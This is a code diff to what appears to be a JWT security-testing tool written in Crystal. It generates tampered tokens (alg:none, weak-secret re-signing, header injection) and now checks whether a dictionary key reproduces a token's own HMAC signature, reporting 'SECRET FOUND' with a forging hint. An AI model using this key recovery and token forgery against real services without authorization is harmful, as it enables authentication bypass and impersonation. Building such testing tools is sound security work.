@@ -12,11 +12,18 @@ module Gori
 
     # One generated payload: a short `name`, its `category` (for grouping/colour), the
     # tampered `token`, and a `note` explaining what server behaviour it probes.
+    #
+    # `verified` is the weak-secret family's answer to the question the family exists to ask.
+    # It is true on the row whose dictionary key REPRODUCES the input token's own signature —
+    # i.e. gori has just recovered the server's HMAC key, and the row is no longer a probe to
+    # go try but a finding. Last, with a default, so every other family's `Attack.new` and
+    # every consumer that predates it are unchanged.
     record Attack,
       name : String,
       category : String,
       token : String,
-      note : String
+      note : String,
+      verified : Bool = false
 
     # The dictionary the weak-secret family re-signs with (HS256). Small on purpose — the
     # point is "is the key one of these obvious values", not a brute-force. "" first: an
@@ -35,9 +42,39 @@ module Gori
       return list unless header
 
       none_family(list, header, header_seg, payload_seg)
-      weak_secret_family(list, header, payload_seg)
+      weak_secret_family(list, header, payload_seg, signature_of(parts), header_seg)
       header_injection_family(list, header, payload_seg)
       list
+    end
+
+    # The token's own signature segment, or nil when there is none to check a key against —
+    # a 2-part token, or a 3-part one whose signature segment is empty (an `alg=none` token,
+    # which no HMAC key "verifies").
+    private def signature_of(parts : Array(String)) : String?
+      return nil unless parts.size >= 3
+      sig = parts[2]
+      sig.empty? ? nil : sig
+    end
+
+    # Does `secret` reproduce this token's OWN signature? The real verification, not a compare
+    # of the generated token against the input:
+    #
+    #   * over the ORIGINAL `header_seg.payload_seg`, never the re-serialized header —
+    #     `header.dup.to_json` need not reproduce the captured header's byte order or spacing,
+    #     so comparing generated tokens would miss the match on any token whose header gori
+    #     does not happen to re-emit identically;
+    #   * under the token's DECLARED alg, never `weak_secret_alg`'s. That one falls back to
+    #     HS256 for an RS256/ES256 token, which is right for generating a downgrade PROBE and
+    #     wrong for claiming a key was found — an HMAC coincidence over an RSA signature says
+    #     nothing about the server's key. So: HS* only, and only the one the token declares.
+    private def hs_secret_verifies?(header, header_seg : String, payload_seg : String,
+                                    signature : String?, secret : String) : Bool
+      return false unless sig = signature
+      declared = header["alg"]?.try(&.as_s?).try(&.upcase)
+      return false unless declared && HMAC_DIGEST.has_key?(declared)
+      sign("#{header_seg}.#{payload_seg}", declared, secret) == sig
+    rescue
+      false
     end
 
     # --- family 1: alg:none + signature strip ------------------------------------
@@ -67,16 +104,29 @@ module Gori
     # the alg check regardless of the key, so the "verifies if the key is X" note was a lie
     # there. A token that isn't HS* (none/RS/ES/PS) falls back to HS256: the classic
     # downgrade-to-HMAC-with-a-weak-key probe.
-    private def weak_secret_family(list, header, payload_seg : String) : Nil
+    # Each key is also CHECKED against the input token, not merely re-signed with. gori already
+    # computed everything the check needs, and said nothing: for a token signed with "secret",
+    # the `secret=secret` row's signature was byte-equal to the token's own and the operator
+    # was told "verifies if the server's HMAC key is …" — an invitation to go send a request
+    # and find out what gori had already proved locally. `verified` says it instead.
+    private def weak_secret_family(list, header, payload_seg : String,
+                                   signature : String?, header_seg : String) : Nil
       alg = weak_secret_alg(header)
       WEAK_SECRETS.each do |secret|
         h = header.dup
         h["alg"] = JSON::Any.new(alg)
         signing_input = "#{b64url(h.to_json)}.#{payload_seg}"
         shown = secret.empty? ? "(empty)" : secret
+        named = secret.empty? ? "empty" : secret.inspect
+        found = hs_secret_verifies?(header, header_seg, payload_seg, signature, secret)
+        note = if found
+                 "SECRET FOUND — this token's own signature verifies with #{named}; " \
+                 "forge any claims with `--encode --secret #{shown}`"
+               else
+                 "verifies if the server's HMAC key is #{named}"
+               end
         list << Attack.new("#{alg} secret=#{shown}", "weak-secret",
-          "#{signing_input}.#{sign(signing_input, alg, secret)}",
-          "verifies if the server's HMAC key is #{secret.empty? ? "empty" : secret.inspect}")
+          "#{signing_input}.#{sign(signing_input, alg, secret)}", note, found)
       end
     end
 
